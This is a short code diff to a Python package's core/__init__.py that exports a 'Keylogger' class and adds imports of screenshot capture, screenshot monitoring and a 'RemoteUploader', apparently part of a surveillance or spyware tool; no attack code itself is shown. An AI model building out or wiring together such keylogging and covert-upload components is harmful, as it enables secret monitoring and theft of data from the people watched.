@@ -13,3 +13,6 @@ from .system_info import SystemInfo
 from . import utils
 
 __all__ = ['Database', 'Keylogger', 'SystemInfo', 'utils']
+
+# Thêm vào file core/__init__.py
+from .screenshot import ScreenshotCapturer, ScreenshotMonitor, RemoteUploader, get_display_info
